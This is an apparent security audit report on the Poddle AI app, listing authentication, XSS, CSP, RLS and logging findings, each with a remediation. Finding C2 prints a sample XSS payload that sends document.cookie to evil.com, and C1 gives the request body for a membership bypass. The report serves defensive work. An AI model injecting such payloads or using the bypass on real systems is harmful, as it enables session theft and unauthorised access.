Executive Summary

This security audit examined the Poddle AI application across three layers: the React frontend, Supabase Edge Functions, and PostgreSQL RLS policies and migrations. The audit identified 20 distinct vulnerabilities spanning 4 severity tiers. The most critical finding is an authentication bypass in the workspace-synthesize Edge Function introduced in the recent background-synthesis feature, which allows any authenticated user to trigger synthesis on workspaces they do not belong to. A stored XSS vector exists via dangerouslySetInnerHTML in the blog rendering component. The Content Security Policy allows 'unsafe-inline' and 'unsafe-eval', which neutralises it as a defence against injected scripts. No issues were found in the link detection component — it correctly restricts to https?:// URLs only. Row-level security coverage is complete (100% of tables) and generally well-implemented.

Critical Severity

4 findings
C1
Authentication Bypass in workspace-synthesize via from_queue Flag
supabase/functions/workspace-synthesize/index.ts · lines 27–44
Critical

The from_queue parameter added to support background synthesis completely bypasses membership verification when set to true. Because this flag is accepted from the request body — which is attacker-controlled — any authenticated user can send { "workspace_id": "<target>", "from_queue": true } to trigger a synthesis run on a workspace they are not a member of. The function uses the workspace owner's user ID (looked up by the service role) for the synthesis run, meaning quota is consumed against the owner and results are overwritten with attacker-influenced data.

Attack Vector
POST /functions/v1/workspace-synthesize with any valid JWT + from_queue:true + victim workspace_id
Recommended Fix
Remove from_queue from the request body. Instead detect internal calls by checking whether the Authorization header carries the service role key: const isInternalCall = authHeader === `Bearer ${serviceKey}`. This cannot be spoofed by a client-side JWT.
C2
Stored XSS via dangerouslySetInnerHTML in Blog Rendering
src/pages/BlogPost.tsx · line 226
Critical

Blog post content from the database is rendered directly via React's dangerouslySetInnerHTML with no sanitization. An attacker with admin access (or a compromised admin account) can publish a blog post containing a script payload that executes in every visitor's browser. This affects all unauthenticated visitors on the guest homepage as well as logged-in users.

Affected Payload
<script>fetch('https://evil.com?c='+document.cookie)</script> in blog content field
Recommended Fix
Install dompurify and sanitize before rendering: dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}. Alternatively, store content as Markdown and render with a safe Markdown renderer.
C3
Content Security Policy Allows 'unsafe-inline' and 'unsafe-eval'
public/_headers · line 32
Critical

The CSP header for all routes permits 'unsafe-inline' and 'unsafe-eval' in the script-src directive. This completely neutralises the CSP as a defence against cross-site scripting attacks — any injected inline script (such as the payload in C2) will execute without restriction. The header also lacks Strict-Transport-Security (HSTS), meaning browsers are not instructed to enforce HTTPS.

Recommended Fix
Remove 'unsafe-inline' and 'unsafe-eval'. Use nonces or hashes for legitimate inline scripts. Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Add X-Frame-Options: DENY to the root route.
C4
Architecture Blueprint Publicly Accessible
public/poddle-architecture-blueprint-v2.doc · served at /poddle-architecture-blueprint-v2.doc
Critical

A detailed architecture document is checked into the public/ directory and therefore served to any visitor at a predictable URL. Combined with the Supabase project ID already visible in netlify.toml, this gives an attacker a complete map of the technical stack, data models, and integration points before any active reconnaissance. A prior security audit file (security-audit.docx) is also served publicly.

Recommended Fix
Remove poddle-architecture-blueprint-v2.doc, security-audit.docx, and any other internal documents from public/ immediately. Store these in a private repository or document management system instead.

High Severity

7 findings
H1
No Role-Based Access Control on Workspace Operations
supabase/functions/workspace-ai-chat/index.ts · lines 384–395
High

The membership check on the workspace AI chat function retrieves the member's role but never validates it. Any member — including those with a viewer or read-only role — can send messages, trigger 3-round agent debates, and consume the daily AI message quota. This violates the principle of least privilege and can be exploited to exhaust workspace AI quotas.

Recommended Fix
After fetching membership, validate the role: if (!['owner','admin','editor'].includes(membership.role)) return 403
H2
No Rate Limiting on Password Reset Endpoint
src/pages/Auth.tsx · lines 70–80 · supabase/functions/send-password-reset/index.ts
High

The password reset flow has no client-side cooldown and no server-side rate limit per IP. An attacker can enumerate valid email addresses (the response differs for registered vs unregistered emails), and can spam the endpoint to generate large volumes of reset emails — both as user harassment and as infrastructure abuse.

Recommended Fix
Add a 60-second client cooldown after each request. In the edge function, implement a per-IP rate limit of 3 requests per hour using a database table or Upstash Redis.
H3
Sensitive Tokens Stored in localStorage / sessionStorage
src/App.tsx · lines 108–111, 246–262 · src/contexts/AuthContext.tsx
High

Workspace invite tokens, referral codes, and post-login redirect targets are stored in localStorage and sessionStorage in plaintext. Both stores are accessible to any JavaScript executing on the page. If C2 (blog XSS) or any other XSS vector is exploited, all stored tokens can be exfiltrated silently.

Recommended Fix
Pass invite tokens and referral codes only via URL state (URL params or fragments, not storage). For redirect targets, store only validated path strings (no full URLs). Clear all stored tokens on logout.
H4
Admin Delete User Function Has No Audit Trail
supabase/migrations/20260322104814_add_delete_user_function.sql
High

The delete_user_account() SECURITY DEFINER function permanently deletes a user and all their data across 40+ tables with no audit record. If an admin account is compromised, account deletions are undetectable. The function also lacks a transaction wrapper — if any of the 40+ DELETE statements fail, the user is left in a partially deleted state.

Recommended Fix
Create an admin_audit_log table. Insert a row before executing deletions. Wrap the entire function body in BEGIN ... EXCEPTION WHEN OTHERS THEN ROLLBACK; RAISE;.
H5
No Audit Logging on get_admin_all_users() RPC
supabase/migrations/20260626165233_create_get_admin_all_users_rpc.sql · lines 33–73
High

The get_admin_all_users() function returns a directory of all users including emails, names, and account metadata, with no record of who accessed it or when. A compromised admin account could extract the full user directory repeatedly without detection.

Recommended Fix
Log each invocation: INSERT INTO admin_audit_log (admin_id, action) VALUES (auth.uid(), 'get_all_users') at the start of the function. Alert if the same admin calls it more than 3 times per hour.
H6
Race Condition in onAuthStateChange — Silent Profile Creation Failures
src/contexts/AuthContext.tsx · lines 61–199
High

Multiple async database operations (profile creation, admin check, referral processing) run inside a fire-and-forget async IIFE within the onAuthStateChange callback. If profile creation fails silently, the user is marked as authenticated in the React context but has no corresponding profile record — causing undefined behaviour throughout the app (null profile, failed queries, broken UI). There is no timeout on any database query in this path.

Recommended Fix
Wrap each async block in try/catch. Add a 5-second timeout using Promise.race. If profile creation fails, set an error state and show a recoverable error screen rather than leaving the user in a broken authenticated state.
H7
Admin Idle Timeout Uses Local Scope — Does Not Invalidate Other Sessions
src/contexts/AuthContext.tsx · lines 44–50
High

The admin inactivity logout calls signOut({ scope: 'local' }), which only clears the local session. Other browser tabs and devices remain authenticated. An attacker who steals an admin's session token (e.g. via the XSS vector in C2) retains access even after the admin's primary device times out.

Recommended Fix
Use signOut({ scope: 'global' }) to invalidate all sessions. Alternatively, store a last_active timestamp for admins in the database and verify it server-side on each sensitive operation.

Medium Severity

6 findings
M1
Anonymous Contact Form and Inbox Submissions Have No Length Constraints
supabase/migrations/20260408102742 · 20260618143553
Medium

Both the contact form and decision inbox accept anonymous submissions with WITH CHECK (true) and no column-level length constraints. This enables spam attacks, storage exhaustion, and large-payload injection at zero cost.

Recommended Fix
Add CHECK constraints on string columns: char_length(message) BETWEEN 10 AND 10000. Add a per-IP rate limit of 3 submissions per hour using pg_net or an edge function.
M2
CORS Wildcard Origin on All Edge Functions
All 24 supabase/functions/*/index.ts — Access-Control-Allow-Origin: *
Medium

Every Edge Function sets Access-Control-Allow-Origin: *. While Supabase JWT authentication prevents unauthenticated cross-origin requests from succeeding, the wildcard header is unnecessary and removes a defence-in-depth layer. Combined with XSS in C2, a malicious page could call authenticated Edge Functions on behalf of the logged-in user.

Recommended Fix
Restrict to production origin: Access-Control-Allow-Origin: https://poddle.me. Use an environment variable so staging environments can be accommodated.
M3
Referral Code Enumeration via Client-Side Validation
src/contexts/AuthContext.tsx · lines 149–177
Medium

Referral codes are stored in localStorage and validated client-side against the referral_codes table during sign-up with no rate limit. An attacker can automate requests to enumerate valid codes and identify active users' referral links.

Recommended Fix
Remove referral codes from localStorage. Pass them only via URL parameters cleared after first use. Add server-side rate limiting (5 lookups per IP per hour).
M4
View Count Functions Exploitable for Metrics Inflation
supabase/migrations/20260410222916_add_viral_sharing_counts.sql · lines 91–174
Medium

The increment_*_view() and increment_*_share() functions are callable by anonymous users with session-based deduplication. Because session IDs are attacker-controlled, an adversary can inflate view and share counts on any content by cycling unique session identifiers.

Recommended Fix
Add IP-address-based bucketing using inet_client_addr() and a short-window rate check: max 10 increments per IP per hour per content item.
M5
PDF Export Has No Workspace Membership Check
src/lib/pdfExport.ts — all export functions
Medium

The PDF export functions receive synthesis and chat data from the caller without independently verifying workspace membership. If a caller passes workspace data obtained via another vulnerability, the export functions will silently produce a PDF containing that data with no access check of their own.

Recommended Fix
Log each export to a workspace_pdf_exports table with user ID and timestamp. Validate workspace membership inside the export function before processing.
M6
AI Chat Rate Limit Too High — API Cost Exposure
supabase/functions/ask-agents/index.ts · line 34
Medium

Authenticated users are permitted 30 requests per hour to the ask-agents endpoint. Each request triggers multiple GPT-4 completions costing approximately $0.02–0.10. At the upper bound, a single user can generate $3/hour in API costs without triggering any limit. Across multiple accounts this becomes a significant financial exposure.

Recommended Fix
Lower the authenticated hourly limit to 10. Add a daily cap of 50. Implement cost-based alerting that triggers when a user's estimated daily spend exceeds $1.

Low / Informational

3 findings
L1
robots.txt Discloses Private Route Structure
public/robots.txt · lines 14–24
Low

The robots.txt file explicitly disallows /workspace/ and /#workspace/, revealing the existence and naming of private routes to search engine crawlers and attackers. The Supabase project ID is also visible in netlify.toml and the sitemap endpoint.

Recommended Fix
Remove specific private route paths from robots.txt. Use a generic Disallow: / for sensitive areas or rely solely on authentication. Remove or proxy the generate-sitemap URL so the Supabase project ID is not exposed.
L2
Verbose Error Messages in Edge Functions
Multiple edge functions — error detail field in JSON responses
Low

Several Edge Functions return internal error details in the detail field of error responses (e.g. { error: "...", detail: deleteError.message }). These messages can reveal internal table names, column names, and constraint names.

Recommended Fix
Return only generic messages to clients. Log full error details server-side via console.error (visible in Supabase function logs) only.
L3
No Centralised Audit Logging for Privileged Operations
Multiple admin functions and RPCs
Low

Admin operations (delete user, ban user, reject verification, get all users) produce no audit trail. This makes post-incident investigation impossible and means compliance requirements (GDPR right to erasure logging, SOC 2 access controls) cannot be met.

Recommended Fix
Create a single admin_audit_log table. Add an INSERT at the beginning of every SECURITY DEFINER function that performs privileged operations. Expose this log in the admin dashboard.

Remediation Roadmap

Replace the client-controlled flag with internal service-key detection. This vulnerability is exploitable today with no special tooling.

ASAP

Remove architecture documents from public/ (C4)

Delete poddle-architecture-blueprint-v2.doc and security-audit.docx from the public directory immediately.

Urgent

Sanitize blog content before rendering (C2)

Install DOMPurify and wrap all dangerouslySetInnerHTML usages. This is a 30-minute fix that closes a full stored XSS vector.

Remove unsafe-inline and unsafe-eval from script-src. Add HSTS. Add X-Frame-Options: DENY to the root route.
